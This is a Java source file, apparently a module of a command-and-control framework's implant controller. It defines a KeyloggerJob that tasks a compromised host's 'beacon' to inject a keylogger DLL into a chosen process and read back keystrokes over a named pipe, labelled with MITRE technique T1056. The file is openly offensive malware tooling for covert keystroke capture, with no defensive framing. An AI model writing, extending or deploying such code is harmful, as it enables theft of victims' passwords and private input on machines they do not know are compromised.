package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;

public class KeyloggerJob
        extends Job {
    public KeyloggerJob(TaskBeacon tasker) {
        super(tasker);
    }

    @Override
    public String getDescription() {
        if (this.isInject()) {
            return "Tasked beacon to log keystrokes in " + this.pid + " (" + this.arch + ")";
        }
        return "Tasked beacon to log keystrokes";
    }

    @Override
    public String getShortDescription() {
        return "keystroke logger";
    }

    @Override
    public String getDLLName() {
        if (this.arch.equals("x64")) {
            return "resources/keylogger.x64.dll";
        }
        return "resources/keylogger.dll";
    }

    @Override
    public String getPipeName() {
        return "keylogger";
    }

    @Override
    public int getCallbackType() {
        return 1;
    }

    @Override
    public int getWaitTime() {
        return 0;
    }

    @Override
    public String getTactic() {
        return "T1056";
    }
}

